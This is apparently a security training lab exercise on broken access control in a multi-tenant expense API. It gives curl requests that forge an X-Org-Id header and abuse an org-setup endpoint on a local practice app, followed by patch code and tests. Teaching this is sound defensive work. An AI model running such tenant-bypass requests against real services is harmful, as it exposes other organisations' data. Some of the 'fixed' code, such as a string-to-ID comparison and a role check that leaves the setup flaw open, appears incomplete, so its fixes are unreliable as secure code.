# Exercise 05 — Broken Access Control: Multi-Tenant & State Confusion
## Exploiting Cross-Organization Access and Request State Manipulation

> **Difficulty:** ⭐⭐⭐⭐⭐  
> **Flags to capture:** 2  
> **OWASP Category:** [A01:2021 – Broken Access Control](https://owasp.org/Top10/A01_2021-Broken_Access_Control/)  
> **Prerequisites:** All previous exercises (this is advanced).

---

## Your Mission

The ExpenseTracker API now supports multiple **organizations** (tenants). Each user belongs to one organization, and should only see expenses and users within their organization.

But two things went wrong:

1. **The organization context isn't properly validated on every request** — a user can switch orgs mid-session
2. **A privilege escalation vulnerability exists during the organization setup phase** — the first user to access an org automatically becomes admin (forever)

Your job: Exploit these to escalate across organizations and capture flags.

---

## Background: Multi-Tenant Security

Multi-tenant applications have an extra authorization layer:

```
Traditional:  Can I (user) access this (resource)?
Multi-tenant: Can I (user) in org A access this (resource in org B)?
```

If the org context is:
- **Not validated per request** — users can manipulate their org membership
- **Not checked on resource access** — users leak data across orgs
- **Assumed stateful** — users can change context mid-session
- **Not cleared on logout** — context persists

All of these are exploitable.

---

## Phase 1: Recon

### Set Up Organizations

The app now has an org setup endpoint:

```bash
# Org Setup — creates new org and makes caller the admin
curl -s -X POST http://localhost:3000/api/org/setup \
  -H "Content-Type: application/json" \
  -d '{"orgName":"AliceCorp","adminEmail":"alice@example.com"}' | jq .
```

### Retrieve Organization Context

```bash
# Who am I and which org am I in?
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)

curl -s http://localhost:3000/api/org/me \
  -H "Authorization: Bearer $TOKEN" | jq .
```

---

## Phase 2: Exploit

### Vulnerability A: Organization Assumption Bypass

The server stores organization context in the JWT at login time. But **it never re-validates which org you belong to**.

```bash
# Step 1: Alice logs in (org: AliceCorp)
TOKEN=$(curl -s -X POST http://localhost:3000/api/auth/login \
  -H "Content-Type: application/json" \
  -d '{"username":"alice","password":"password123"}' | jq -r .token)

# Decode the token to see the orgId
node -e "console.log(JSON.parse(Buffer.from('$TOKEN'.split('.')[1], 'base64url').toString()))"

# Step 2: Manually set orgId to 2 (BobCorp) in a request header
curl -s http://localhost:3000/api/expenses \
  -H "Authorization: Bearer $TOKEN" \
  -H "X-Org-Id: 2" | jq .
```

Expected (vulnerable): Alice sees BobCorp's expenses  
Expected (fixed): 403 Forbidden or request is rejected

---

### Vulnerability B: First User = Org Admin Forever

When an organization is set up, the endpoint doesn't check if the caller already has a role. It assumes the first person to call it **becomes the admin automatically**.

But the bug: **there's no validation that this person should be an admin**, and **no re-validation after the org is created**.

```bash
# Scenario: Alice creates "CompanyX"
curl -s -X POST http://localhost:3000/api/org/setup \
  -H "Content-Type: application/json" \
  -d '{"orgName":"CompanyX","adminEmail":"alice@example.com"}' | jq .

# Response: Alice is now OrgAdmin with org_id=3

# Then Bob (who shouldn't be in CompanyX) manually crafts a token claiming org_id=3
# OR: Bob calls a protected endpoint but it doesn't re-check he's in that org

curl -s -X POST http://localhost:3000/api/org/invite \
  -H "Authorization: Bearer $BOB_TOKEN" \
  -H "X-Org-Id: 3" \
  -H "Content-Type: application/json" \
  -d '{"username":"bob","role":"admin"}' | jq .
```

Expected (vulnerable): Bob can invite himself or change roles  
Expected (fixed): 403 Forbidden

---

## Phase 3: Root Cause Analysis

Questions to answer:

1. **Where is the org context stored?** JWT? Header? Session?
2. **Is it re-validated on each request?** Or assumed static?
3. **What happens if a user manually sets `X-Org-Id` to a different org?**
4. **Does the setup endpoint check if the caller should be admin?**
5. **Is there a separate permissions table per org, or global?**

Look for:

- Routes that trust `X-Org-Id` header without validating against JWT
- Middleware that sets org context once and never re-checks
- Setup endpoints that don't verify the caller's eligibility
- Insufficient filtering of `findExpensesByOrg` queries

---

## Phase 4: Patching

### Fix A: Validate Org Context on Every Request

```javascript
// BEFORE (vulnerable):
const orgId = req.headers['x-org-id'] || req.user.orgId;
const expenses = getExpensesByOrg(orgId);

// AFTER (fixed):
const orgId = req.user.orgId;  // ONLY from JWT, never from headers!
// Or if headers are allowed:
if (req.headers['x-org-id'] && req.headers['x-org-id'] !== req.user.orgId) {
  return res.status(403).json({ error: 'Org mismatch' });
}
const expenses = getExpensesByOrg(orgId);
```

### Fix B: Validate User Belongs to Org Before Setup

```javascript
// BEFORE (vulnerable):
app.post('/api/org/setup', verifyToken, (req, res) => {
  const newOrg = createOrganization(req.body.orgName);
  assignUserToOrg(req.user.userId, newOrg.id, 'admin');
  // No check if user already has an org!
});

// AFTER (fixed):
app.post('/api/org/setup', verifyToken, (req, res) => {
  // Check user isn't already admin of another org
  if (req.user.role === 'org_admin') {
    return res.status(400).json({
      error: 'User is already an org admin elsewhere',
    });
  }
  const newOrg = createOrganization(req.body.orgName);
  assignUserToOrg(req.user.userId, newOrg.id, 'org_admin');
});
```

### Fix C: Always Filter by Both User AND Org

```javascript
// BEFORE (vulnerable):
const expenses = findExpensesByOwner(req.user.userId);

// AFTER (fixed):
const expenses = findExpensesByOwner(req.user.userId)
  .filter(exp => exp.orgId === req.user.orgId);
```

---

## Phase 5: Verification

Run the tests:

```bash
npm run test:05
```

Expected output:
- 🔴 **Exploit tests FAIL** (bugs are now fixed)
- 🟢 **Hardening tests PASS** (your patches work)

---

## Real-World Impact

This class of vulnerability affects:

- **SaaS platforms** — Slack, Notion, GitHub Organizations, Jira Cloud
- **Multi-tenant databases** — Wrong tenant isolation can leak all customer data
- **Account provisioning** — First-user escalation is common during onboarding
- **Privilege boundaries** — When org admin != system admin

---

## Key Takeaway

**Never trust user-controlled data to determine authorization boundaries.**

In multi-tenant systems:
- ✅ Store tenant ID in secure, non-user-editable format (JWT, server-side session)
- ✅ Validate tenant on EVERY request, never assume it's static
- ✅ Filter ALL database queries by both user ID and tenant ID
- ✅ Test with multiple tenants explicitly (many devs test with one tenant only!)

